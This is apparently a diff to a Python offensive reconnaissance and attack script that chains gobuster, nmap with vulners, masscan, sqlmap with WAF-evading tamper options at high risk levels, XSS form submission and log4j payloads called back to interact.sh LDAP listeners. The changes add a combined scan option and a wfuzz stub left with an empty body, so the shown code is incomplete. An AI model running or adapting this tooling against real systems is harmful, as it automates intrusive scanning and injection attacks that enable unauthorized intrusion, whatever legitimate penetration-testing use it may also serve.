@@ -30,8 +30,7 @@ from urllib.parse import urljoin
 import webbrowser
 # from icecream import ic #cool print debugging, did a pip3 install but shows an error, still works though ;0 (https://towardsdatascience.com/do-not-use-print-for-debugging-in-python-anymore-6767b6f1866d)
 
-
-#### VARS
+## Vars ##
 
 ##Logging##
 logTarget = "targetlogfilename"
@@ -40,18 +39,24 @@ logTarget = "targetlogfilename"
 # Make sure you / at the end $path/logs/ NOT $path/logs
 logDir = f"~/{platform}/{logTarget}/logs/"
 logDir = f"~/{logTarget}/logs/"
+##</Logging##
 
-##Wordlists##
+##wordlists##
 #wordlist="/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt"
 wordlist = "/usr/share/wordlists/dirb/common.txt"
-randomIntSmall = random.randint(2,11)    #random int between 1 & 10
-randomIntBig = random.randint(2,1001)
+##</wordlists##
 
-##interact.sh listeners##
+##listeners##
 attackerLDAP = 'yourinteracturl.interact.sh:1389'
 callback_host = 'yourinteracturl.interact.sh'
+##</listeners##
 
-####
+##helpful tidbits##
+randomIntSmall = random.randint(2,11)    #random int between 1 & 10
+randomIntBig = random.randint(2,1001)
+##</helpful tidbits##
+
+## </Vars ##
 
 
 def generate_payload(protocol, callback_attacker, payload_string):
@@ -187,9 +192,9 @@ def formSubmit(url, payload=xsspayloads[0]):
 
 
 def goBuster(URL=None):
-    #command = f"gobuster dir -u 'https://{{target}}' -w '{wordlist}' -o '{logDir}{{target}}-gobusted{randomIntSmall}' --wildcard -r"
-    # command = f"gobuster dir -u '{{target}}' -w '{wordlist}' --wildcard -r"     #this is used more of a specific URL, https://target/admin/
-    command = f"gobuster dir -u '{{target}}' -w '{wordlist}' --wildcard -r -o '{logDir}{{target}}-gobusted{randomIntSmall}"
+    
+    singlecommand = f"gobuster dir -u '{{target}}' -w '{wordlist}' --wildcard -r >> '{logDir}gobusted{randomIntSmall}'"     #this is used more of a specific URL, https://target/admin/
+    command = f"gobuster dir -u '{{target}}' -w '{wordlist}' --wildcard -r >> '{logDir}{{target}}-gobusted{randomIntSmall}'"
 
     cprint(f"Using wordlist: {wordlist}\n", "yellow")
     time.sleep(3)
@@ -204,9 +209,9 @@ def goBuster(URL=None):
 
     else:
         cprint(f"[Single] Running gobuster on: {URL}\n", "green")
-        cprint(f"[Single] Log file: {logDir}{URL}-gobusted \n", "yellow")
+        cprint(f"[Single] Log files: {logDir} \n", "yellow")
 
-        os.system(command.replace("{target}", URL))
+        os.system(singlecommand.replace("{target}", URL))
         
 
 def wayBackURLs(domain=None):
@@ -326,8 +331,6 @@ def log4j(URL=None):
             else:
                 cprint(f"Normal Payloads sent to: {URL}", "magenta")
 
-
-
         
 ###Fix the duplicate with the replace like gobuster or waybackurls
 def sqlmap(url=None):
@@ -340,9 +343,11 @@ def sqlmap(url=None):
     # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --forms --crawl=2"
     # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --forms --tamper=apostrophemask --random-agent --level 3 --risk 3"
     # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --forms --tamper=apostrophemask --random-agent --crawl=5"
-    # SQLMap = f'sqlmap -u  "{url}" --banner --batch --tamper=apostrophemask --random-agent --level 3 --risk 3'
-    # SQLMapForms = f'sqlmap -u  "{url}" --banner --forms --batch --tamper=apostrophemask --random-agent --level 3 --risk 3'
+    SQLMap = f'sqlmap -u  "{url}" --banner --batch --tamper=apostrophemask --random-agent --level 3 --risk 3'
+    SQLMapForms = f'sqlmap -u  "{url}" --banner --forms --batch --tamper=apostrophemask --random-agent --level 3 --risk 3'
+    
     if url == None:
+
         cprint("SQLMap will target URL's in file: SQLMapTargets", "red")
         cprint("\nYou can hit ctl + c during a scan and then hit [n]next parameter or [e]end detection", "red")
         cprint("This will allow you to end scan on current target it if appears to not be vulnerable but NOT the script\n", "yellow")
@@ -350,12 +355,12 @@ def sqlmap(url=None):
 
         # SQLMap = f"sqlmap --banner --batch --tamper=apostrophemask --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 3 --smart"
         # SQLMapForms = f"sqlmap --banner --forms --batch --tamper=apostrophemask --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 3 --smart"
-        SQLMapForms = f"sqlmap --current-user --forms --batch --tamper=apostrophemask,space2comment,space2hash --random-agent -o -m {logDir}SQLMapTargets --risk 2 --level 2"
-        SQLMap = f"sqlmap --current-user --batch --tamper=apostrophemask,space2comment,space2hash --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 5"
+        # SQLMapForms = f"sqlmap --current-user --forms --batch --tamper=apostrophemask,space2comment,space2hash --random-agent -o -m {logDir}SQLMapTargets --risk 2 --level 2"
+        # SQLMap = f"sqlmap --current-user --batch --tamper=apostrophemask,space2comment,space2hash --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 5"
         # SQLMap = f"sqlmap --hex --tamper=base64encode --random-agent --risk 3 --level 5 --threads 10 --batch -b -m {logDir}SQLMapTargets"
         # sqlMapTamperMySQL = f"sqlmap --current-user --tamper=between,bluecoat,charencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor -m {logDir}SQLMapTargets"
         # sqlmapCrawl = f'sqlmap --current-user --forms --batch --crawl=5 --tamper=apostrophemask,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion --random-agent -o --risk 2 --level 2 -m {logDir}SQLMapTargets'
-        time.sleep(1)
+        # time.sleep(1)
         # cprint("Running command: " + SQLMapInject, "magenta")
         # os.system(SQLMapInject)
         cprint("Running command: " + SQLMap, "magenta")
@@ -381,7 +386,7 @@ def sqlmap(url=None):
         sqlMapTamper = f'sqlmap {url} -v 3 --risk 3 --level 5 --dump --random-agent --tamper="between,randomcase,space2comment"'
         sqlmapCrawl = f'sqlmap {url} --current-user --forms --batch --crawl=5 --tamper=apostrophemask,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion --random-agent -o --risk 2 --level 2'
         
-        time.sleep(1)
+        # time.sleep(1)
         
         # cprint("Running command: " + sqlmapSingle, "magenta")
         # os.system(sqlmapSingle)
@@ -396,7 +401,11 @@ def sqlmap(url=None):
         # cprint("Running tamper tor command: " + sqlMapTamper, "magenta")
         # os.system(sqlMapTamper)
         # os.system(f'sqlmap -u {url} --current-user --batch --tamper=apostrophemask,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion --random-agent -o --risk 2 --level 2')
-        os.system(f'sqlmap -u {url} --current-user --batch --tamper="apostrophemask,between,randomcase,space2comment" --random-agent -o --risk 3 --level 5')
+        # os.system(f'sqlmap -u {url} --current-user --batch --tamper="apostrophemask,between,randomcase,space2comment" --random-agent -o --risk 3 --level 5')
+        cprint("Running command: " + SQLMap, "magenta")
+        os.system(SQLMap)
+        cprint("Running command: " + SQLMapForms, "magenta")
+        os.system(SQLMapForms)
 
 
 ###Fix the duplicate with the replace like gobuster or waybackurls
@@ -468,24 +477,47 @@ def IPlookup(host):
         return ipval.to_text()
 
 
-def nmap():
-    cprint("Running NMAP &(or) masscan on NMAPTargets file \n", "green")
-    cprint("Masscan doens't take domains as input, only IP's but an NSLookup will occur on any domain", "red")
+def nmap(dom=None):
+    cprint("Masscan doens't take domains as input, only IP's but an NSLookup will occur on domains", "red")
 
-    for dom in open(logDir + "NMAPTargets", "r").read().splitlines():
-        
-        cprint(f"Running nmap on {dom} log file location: {logDir}{dom}-nmap", "green")
-        # os.system(f"nmap -sC -A -T 4 -sV -Pn --top-ports 100 {dom} >> {logDir}{dom} -nmap")
-        os.system(f"nmap -sC -A -T 4 -sV -Pn -p- {dom} >> {logDir}{dom}-nmap")    
-        os.system(f"nmap -sV --script vulners {dom} >> {logDir}/{dom}-vulners")
-        #os.system(f"sudo nmap -sU -sT -p- -Pn {dom} >> {logDir}/{dom}-udpallports")    # requires to be run as sudo
-        
-        # cprint(f"Running masscan on {dom} log file location: {logDir}{dom}-masscan", "green")
+    # os.system(f"nmap -sC -A -T 4 -sV -Pn --top-ports 100 {dom} >> {logDir}{dom} -nmap")
+    nmap = (f"nmap -sC -A -T 4 -sV -Pn -p- {{dom}} >> {logDir}{{dom}}-nmap")    
+    vulners = (f"nmap -sV --script vulners {{dom}} >> {logDir}{{dom}}-vulners")
+    udpallports = (f"sudo nmap -sU -sT -p- -Pn {{dom}} >> {logDir}{{dom}}-udpallports")    # requires to be run as sudo
+
+    if dom == None:
+        cprint("[Batch] Running NMAP &(or) masscan on NMAPTargets file \n", "green")
+        for dom in open(logDir + "NMAPTargets", "r").read().splitlines():
+            
+            cprint(f"[Batch] Running nmap on {dom} log file location: {logDir}{dom}-nmap\n", "green")
+            cprint("Commands being run:\n", "green")
+            nmap = nmap.replace("{dom}", dom)
+            vulners = vulners.replace("{dom}", dom)
+            cprint(nmap, "magenta")
+            cprint(vulners, "magenta")
+            os.system(nmap)
+            os.system(vulners)
+    
+            # cprint(f"[Batch] Running masscan on {dom} log file location: {logDir}{dom}-masscan", "green")
+            # masscanIP = IPlookup(dom)
+            # os.system(f"sudo masscan {masscanIP} -p 1-65535 -oX {logDir}{dom}-masscan")
+
+    else:
+
+        cprint(f"[Single] Running nmap on {dom} log file location: {logDir}{dom}-nmap\n", "green")
+        cprint("Commands being run:\n", "green")
+        nmap = nmap.replace("{dom}", dom)
+        vulners = vulners.replace("{dom}", dom)
+        cprint(nmap, "magenta")
+        cprint(vulners, "magenta")
+        os.system(nmap)
+        os.system(vulners)
+
+        # cprint(f"[Single] Running masscan on {dom} log file location: {logDir}{dom}-masscan", "green")
         # masscanIP = IPlookup(dom)
-        # os.system(f"masscan {masscanIP} -p 1-65535 -oX {logDir}{dom}-masscan")
+        # os.system(f"sudo masscan {masscanIP} -p 1-65535 -oX {logDir}{dom}-masscan")
+
         
-
-
 # Used to remove .png, .jpg, .svg, etc
 def removeUnwanted(file=None):
 
@@ -704,6 +736,9 @@ def fuzzUrls():
                 
             except Exception as e:
                 cprint(e, "red")
+
+def wfuzz(URL):
+    
                         
     
 def wpscan(URL=None):
@@ -779,6 +814,7 @@ parser.add_argument("--recon-active", action='store_false', help='Runs recon-pas
 parser.add_argument("--attack", action='store_false', help='Runs XSS, log4j, & SQLMap functions. Required files: \033[92m\033[1mtargetsWithCodes200\033[0m, \033[92m\033[1mlog4jtargs\033[0m, && \033[92m\033[1mSQLMapTargets\033[0m')
 parser.add_argument("--recon-attack", action='store_false', help='Combines recon-active && attack functions')
 parser.add_argument("--xss-log4j", action='store_false', help='Combines XSS && Log4j functions. Required files: \033[92m\033[1mtargetsWithCodes200\033[0m && \033[92m\033[1mlog4jtargs\033[0m')
+parser.add_argument("--bustmap", nargs='?', metavar="DOMAIN", help='Run NMAP and(or) Masscan plus gobuster on file(s): \033[92m\033[1mNMAPTargets\033[0m && \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --bustmap) OR single domain: (python3 recon.py --bustmap $domain)')
 parser.add_argument("--log4j", nargs='?', metavar="URL", help='Run log4j scanner on file: \033[92m\033[1mlog4jtargs\033[0m (python3 recon.py --log4j) OR single URL: (python3 recon.py --log4j $URL)')
 parser.add_argument("--sqlmap", nargs='?', metavar="URL", help='Run SQLMap on file: \033[92m\033[1mSQLMAPTargets\033[0m (python3 recon.py --sqlmap) or single URL (python3 recon.py --sqlmap $url)')
 parser.add_argument("--nmap", nargs='?', metavar="DOMAIN", help='Run NMAP and(or) Masscan on file: \033[92m\033[1mNMAPTargets\033[0m (python3 recon.py --nmap) OR single domain: (python3 recon.py --nmap $domain)')
@@ -794,6 +830,7 @@ parser.add_argument("--bypass403", action='store_false', help='Run 403 bypasses 
 parser.add_argument("--formsubmit", nargs='?', metavar="URL", help='Submit XSS payload to single URL (python3 recon.py --formsubmit $url) \033[92m\033[1mBatch runtime use XSS and Log4j modules\033[0m')
 parser.add_argument("--urlfuzz", action='store_false', help='Required file: \033[92m\033[1mfuzzUrlTargs\033[0m Fuzz url inputs from file replacing keyword "hoopety" with payload\033[31;1;92m manually\033[0m first (xss & log4j payloads are used)')
 parser.add_argument("--wpscan", nargs='?', metavar="URL", help='Run WPScan on file: \033[92m\033[1mwordpressTargs\033[0m (python3 recon.py --wpscan) OR single URL: (python3 recon.py --wpscan $url)')
+parser.add_argument("--wfuzz", metavar='[target.com or IP]', help='Run wfuzz on user supplied target URL')
 parser.add_argument("--genpayloads", metavar="[LISTENER]", help='Enter callback_host or listener') #Pass protocol (dns, rmi, ldap) add this to this
 parser.add_argument("--removeunwanted", metavar="[FILE]", help='Remove .img, .png, .pdf, .css, .js from a file. Remember to check out the full waybackurls file for .js and other files for manual testing')
 parser.add_argument("--createfiles", action='store_false', help='Create files not auto generated, ensure your log directory is set')
@@ -805,7 +842,7 @@ args = parser.parse_args()
 def main():
     try:
        opts, args = getopt.getopt(sys.argv[1:],"hi:", 
-            ["help", "recon-passive", "recon-active", "attack", "recon-attack", "xss-log4j", "log4j", "sqlmap", "nmap", "urlstatus", "waybackurls", "sublister", "amass", "subbrute", "gobuster", "xss", "hydra", "bypass403", "formsubmit", "urlfuzz", "wpscan", "genpayloads", "removeunwanted", "createfiles", "addhttps", "test"])
+            ["help", "recon-passive", "recon-active", "attack", "recon-attack", "xss-log4j", "bustmap", "log4j", "sqlmap", "nmap", "urlstatus", "waybackurls", "sublister", "amass", "subbrute", "gobuster", "xss", "hydra", "bypass403", "formsubmit", "urlfuzz", "wpscan", "wfuzz", "genpayloads", "removeunwanted", "createfiles", "addhttps", "test"])
     
     except getopt.GetoptError:
       sys.exit(2)
@@ -842,6 +879,14 @@ def main():
         elif opt == ("--xss-log4j"):
             XSS()
             log4j()
+
+        elif opt == ("--bustmap"):
+            if args == []:
+                goBuster()
+                nmap()
+            else:
+                goBuster(args[0])
+                nmap(args[0])
 
         elif opt == ("--log4j"):
             if args == []:
@@ -928,6 +973,9 @@ def main():
                 wpscan()
             else:
                 wpscan(args[0])
+                
+        elif opt == ("--wfuzz"):
+            wfuzz(args[0])
 
         elif opt == ("--genpayloads"):
             callback_attacker = args[0]
